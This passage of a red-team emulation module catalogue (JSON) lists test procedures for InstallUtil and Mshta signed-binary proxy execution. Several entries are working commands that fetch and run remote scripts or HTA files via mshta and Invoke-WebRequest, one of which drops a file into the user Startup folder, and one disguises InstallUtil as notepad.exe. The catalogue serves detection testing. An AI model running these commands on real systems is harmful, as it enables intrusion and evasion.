          "type": "path",
          "default_value": "$Env:TEMP\\"
        },
        {
          "name": "invocation_method",
          "description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable",
          "type": "string",
          "default_value": "InstallHelper"
        },
        {
          "name": "assembly_filename",
          "description": "filename of the compiled installer assembly",
          "type": "string",
          "default_value": "T1218.004.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n",
          "check_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"
        }
      ],
      "rx_module_id": "d43a5bde-ae28-4c55-a850-3f4c80573503",
      "module_name": "InstallHelper method call"
    },
    {
      "index": 987,
      "technique_id": "T1218.004",
      "technique_name": "Signed Binary Proxy Execution: InstallUtil",
      "description": "Executes the installer assembly class constructor. Upon execution, version information will be displayed the .NET framework install utility.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
        "elevation_required": false,
        "cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "test_harness",
          "description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"
        },
        {
          "name": "assembly_dir",
          "description": "directory to drop the compiled installer assembly",
          "type": "path",
          "default_value": "$Env:TEMP\\"
        },
        {
          "name": "invocation_method",
          "description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable",
          "type": "string",
          "default_value": "Executable"
        },
        {
          "name": "assembly_filename",
          "description": "filename of the compiled installer assembly",
          "type": "string",
          "default_value": "T1218.004.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n",
          "check_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"
        }
      ],
      "rx_module_id": "9b7a7cfc-dd2e-43f5-a885-c0a3c270dd93",
      "module_name": "InstallUtil class constructor method call"
    },
    {
      "index": 988,
      "technique_id": "T1218.004",
      "technique_name": "Signed Binary Proxy Execution: InstallUtil",
      "description": "Executes the Install Method. Upon execution, version information will be displayed the .NET framework install utility.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Install_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
        "elevation_required": false,
        "cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "test_harness",
          "description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"
        },
        {
          "name": "assembly_dir",
          "description": "directory to drop the compiled installer assembly",
          "type": "path",
          "default_value": "$Env:TEMP\\"
        },
        {
          "name": "invocation_method",
          "description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable",
          "type": "string",
          "default_value": "Executable"
        },
        {
          "name": "assembly_filename",
          "description": "filename of the compiled installer assembly",
          "type": "string",
          "default_value": "T1218.004.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n",
          "check_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"
        }
      ],
      "rx_module_id": "9f9968a6-601a-46ca-b7b7-6d4fe0f98f0b",
      "module_name": "InstallUtil Install method call"
    },
    {
      "index": 989,
      "technique_id": "T1218.004",
      "technique_name": "Signed Binary Proxy Execution: InstallUtil",
      "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /U `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
        "elevation_required": false,
        "cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "test_harness",
          "description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"
        },
        {
          "name": "assembly_dir",
          "description": "directory to drop the compiled installer assembly",
          "type": "path",
          "default_value": "$Env:TEMP\\"
        },
        {
          "name": "invocation_method",
          "description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable",
          "type": "string",
          "default_value": "Executable"
        },
        {
          "name": "assembly_filename",
          "description": "filename of the compiled installer assembly",
          "type": "string",
          "default_value": "T1218.004.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n",
          "check_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"
        }
      ],
      "rx_module_id": "34428cfa-8e38-41e5-aff4-9e1f8f3a7b4b",
      "module_name": "InstallUtil Uninstall method call - /U variant"
    },
    {
      "index": 990,
      "technique_id": "T1218.004",
      "technique_name": "Signed Binary Proxy Execution: InstallUtil",
      "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
        "elevation_required": false,
        "cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "test_harness",
          "description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"
        },
        {
          "name": "assembly_dir",
          "description": "directory to drop the compiled installer assembly",
          "type": "path",
          "default_value": "$Env:TEMP\\"
        },
        {
          "name": "invocation_method",
          "description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable",
          "type": "string",
          "default_value": "Executable"
        },
        {
          "name": "assembly_filename",
          "description": "filename of the compiled installer assembly",
          "type": "string",
          "default_value": "T1218.004.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n",
          "check_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"
        }
      ],
      "rx_module_id": "06d9deba-f732-48a8-af8e-bdd6e4d98c1d",
      "module_name": "InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant"
    },
    {
      "index": 991,
      "technique_id": "T1218.004",
      "technique_name": "Signed Binary Proxy Execution: InstallUtil",
      "description": "Executes the Uninstall Method. Upon execution, help information will be displayed for InstallUtil.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/? `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_HelpText_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
        "elevation_required": false,
        "cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "test_harness",
          "description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"
        },
        {
          "name": "assembly_dir",
          "description": "directory to drop the compiled installer assembly",
          "type": "path",
          "default_value": "$Env:TEMP\\"
        },
        {
          "name": "invocation_method",
          "description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable",
          "type": "string",
          "default_value": "Executable"
        },
        {
          "name": "assembly_filename",
          "description": "filename of the compiled installer assembly",
          "type": "string",
          "default_value": "T1218.004.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n",
          "check_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"
        }
      ],
      "rx_module_id": "5a683850-1145-4326-a0e5-e91ced3c6022",
      "module_name": "InstallUtil HelpText method call"
    },
    {
      "index": 992,
      "technique_id": "T1218.004",
      "technique_name": "Signed Binary Proxy Execution: InstallUtil",
      "description": "Executes an InstallUtil assembly by renaming InstallUtil.exe and using a nonstandard extension for the assembly. Upon execution, \"Running a transacted installation.\"\nwill be displayed, along with other information about the opperation. \"The transacted install has completed.\" will be displayed upon completion.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"$Env:windir\\System32\\Tasks\"\n$InstallerAssemblyFileName = 'readme.txt'\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"readme.txt\"\n$ExpectedOutput = 'Constructor_'\n\n# Explicitly set the directory so that a relative path to readme.txt can be supplied.\nSet-Location \"$Env:windir\\System32\\Tasks\"\n\nCopy-Item -Path \"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\" -Destination \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'Executable'\n    CommandLine = $CommandLine\n    InstallUtilPath = \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nEvasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.txt\" -ErrorAction Ignore\nRemove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.InstallLog\" -ErrorAction Ignore\nRemove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.InstallState\" -ErrorAction Ignore\nRemove-Item -Path \"$Env:windir\\System32\\Tasks\\notepad.exe\" -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "test_harness",
          "description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"
        }
      ],
      "prerequisites": [
        {
          "description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n",
          "check_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"
        }
      ],
      "rx_module_id": "559e6d06-bb42-4307-bff7-3b95a8254bad",
      "module_name": "InstallUtil evasive invocation"
    },
    {
      "index": 993,
      "technique_id": "T1218.005",
      "technique_name": "Signed Binary Proxy Execution: Mshta",
      "description": "Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "file_url",
          "description": "location of the payload",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1218.005/src/mshta.sct"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "1483fab9-4f52-4217-a9ce-daa9d7747cae",
      "module_name": "Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject"
    },
    {
      "index": 994,
      "technique_id": "T1218.005",
      "technique_name": "Signed Binary Proxy Execution: Mshta",
      "description": "Run a local VB script to run local user enumeration powershell command.\nThis attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.\nUpon execution, a new PowerShell windows will be opened that displays user information.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToRagloxModulesFolder\\T1218.005\\src\\powershell.ps1\"\":close\")\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "906865c3-e05f-4acc-85c4-fbc185455095",
      "module_name": "Mshta executes VBScript to execute malicious command"
    },
    {
      "index": 995,
      "technique_id": "T1218.005",
      "technique_name": "Signed Binary Proxy Execution: Mshta",
      "description": "Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$var =Invoke-WebRequest \"#{hta_url}\"\n$var.content|out-file \"#{temp_file}\"\nmshta \"#{temp_file}\"\nstart-sleep -s 15\nstop-process -name \"calculator\" -Force -ErrorAction Ignore\nstop-process -name \"CalculatorApp\" -Force -ErrorAction Ignore\n",
        "elevation_required": false,
        "cleanup_command": "remove-item \"#{temp_file}\" -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "temp_file",
          "description": "temp_file location for hta",
          "type": "string",
          "default_value": "$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta"
        },
        {
          "name": "hta_url",
          "description": "URL to HTA file for execution",
          "type": "string",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1218.005/src/T1218.005.hta"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "c4b97eeb-5249-4455-a607-59f95485cb45",
      "module_name": "Mshta Executes Remote HTML Application (HTA)"
    },
    {
      "index": 996,
      "technique_id": "T1218.005",
      "technique_name": "Signed Binary Proxy Execution: Mshta",
      "description": "Executes an HTA Application using JScript script engine using local UNC path simulating lateral movement.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath #{mshta_file_path}",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "script_engine",
          "description": "Script Engine to use",
          "type": "string",
          "default_value": "JScript"
        },
        {
          "name": "hta_file_path",
          "description": "HTA file name and or path to be used",
          "type": "string",
          "default_value": "Test.hta"
        },
        {
          "name": "mshta_file_path",
          "description": "Location of mshta.exe",
          "type": "string",
          "default_value": "$env:windir\\system32\\mshta.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "The RAGLOXTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.",
          "check_command": "$RequiredModule = Get-Module -Name RAGLOXTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}",
          "install_command": "Install-Module -Name RAGLOXTestHarnesses -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "007e5672-2088-4853-a562-7490ddc19447",
      "module_name": "Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement"
    },
    {
      "index": 997,
      "technique_id": "T1218.005",
      "technique_name": "Signed Binary Proxy Execution: Mshta",
      "description": "Executes an HTA Application using JScript script engine simulating double click.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -SimulateUserDoubleClick",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "script_engine",
          "description": "Script Engine to use",
          "type": "string",
          "default_value": "JScript"
        },
        {
          "name": "hta_file_path",
          "description": "HTA file name and or path to be used",
          "type": "string",
          "default_value": "Test.hta"
        }
      ],
      "prerequisites": [
        {
          "description": "The RAGLOXTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.",
          "check_command": "$RequiredModule = Get-Module -Name RAGLOXTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}",
          "install_command": "Install-Module -Name RAGLOXTestHarnesses -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "58a193ec-131b-404e-b1ca-b35cf0b18c33",
      "module_name": "Invoke HTML Application - Jscript Engine Simulating Double Click"
    },
    {
      "index": 998,
      "technique_id": "T1218.005",
      "technique_name": "Signed Binary Proxy Execution: Mshta",
      "description": "Executes an HTA Application by directly downloading from remote URI.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "mshta_file_path",
          "description": "Location of mshta.exe",
          "type": "string",
          "default_value": "$env:windir\\system32\\mshta.exe"
        },
        {
          "name": "hta_uri",
          "description": "URI to HTA",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/24549e3866407c3080b95b6afebf78e8acd23352/rx_modules/T1218.005/src/T1218.005.hta"
        }
      ],
      "prerequisites": [
        {
          "description": "The RAGLOXTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.",
          "check_command": "$RequiredModule = Get-Module -Name RAGLOXTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}",
          "install_command": "Install-Module -Name RAGLOXTestHarnesses -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "39ceed55-f653-48ac-bd19-aceceaf525db",
      "module_name": "Invoke HTML Application - Direct download from URI"
    },
    {
      "index": 999,
      "technique_id": "T1218.005",
      "technique_name": "Signed Binary Proxy Execution: Mshta",
      "description": "Executes an HTA Application with JScript Engine, Rundll32 and Inline Protocol Handler.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "rundll32_file_path",
          "description": "Location of rundll32.exe",
          "type": "path",
          "default_value": "$env:windir\\system32\\rundll32.exe"
        },
        {
          "name": "script_engine",
          "description": "Script Engine to use",
          "type": "string",
          "default_value": "JScript"
        },
        {
          "name": "protocol_handler",
          "description": "Protocol Handler to use",
          "type": "string",
          "default_value": "About"
        }
      ],
      "prerequisites": [
        {
          "description": "The RAGLOXTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.",
          "check_command": "$RequiredModule = Get-Module -Name RAGLOXTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}",
          "install_command": "Install-Module -Name RAGLOXTestHarnesses -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "e7e3a525-7612-4d68-a5d3-c4649181b8af",
      "module_name": "Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler"
    },
    {
      "index": 1000,
      "technique_id": "T1218.005",
      "technique_name": "Signed Binary Proxy Execution: Mshta",
      "description": "Executes an HTA Application with JScript Engine and Inline Protocol Handler.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -MSHTAFilePath #{mshta_file_path}",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "mshta_file_path",
          "description": "Location of mshta.exe",
          "type": "path",
          "default_value": "$env:windir\\system32\\mshta.exe"
        },
        {
          "name": "script_engine",
          "description": "Script Engine to use",
          "type": "string",
          "default_value": "JScript"
        },
        {
          "name": "protocol_handler",
          "description": "Protocol Handler to use",
          "type": "string",
          "default_value": "About"
        }
      ],
      "prerequisites": [
        {
          "description": "The RAGLOXTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.",
          "check_command": "$RequiredModule = Get-Module -Name RAGLOXTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}",
          "install_command": "Install-Module -Name RAGLOXTestHarnesses -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "d3eaaf6a-cdb1-44a9-9ede-b6c337d0d840",
      "module_name": "Invoke HTML Application - JScript Engine with Inline Protocol Handler"
    },
    {
      "index": 1001,
      "technique_id": "T1218.005",
      "technique_name": "Signed Binary Proxy Execution: Mshta",
      "description": "Executes an HTA Application with Simulate lateral movement over UNC Path.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path}",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "mshta_file_path",
          "description": "Location of mshta.exe",
          "type": "string",
          "default_value": "$env:windir\\system32\\mshta.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "The RAGLOXTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.",
          "check_command": "$RequiredModule = Get-Module -Name RAGLOXTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}",
          "install_command": "Install-Module -Name RAGLOXTestHarnesses -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "b8a8bdb2-7eae-490d-8251-d5e0295b2362",
      "module_name": "Invoke HTML Application - Simulate Lateral Movement over UNC Path"
    },
    {
      "index": 1002,
      "technique_id": "T1218.005",
      "technique_name": "Signed Binary Proxy Execution: Mshta",
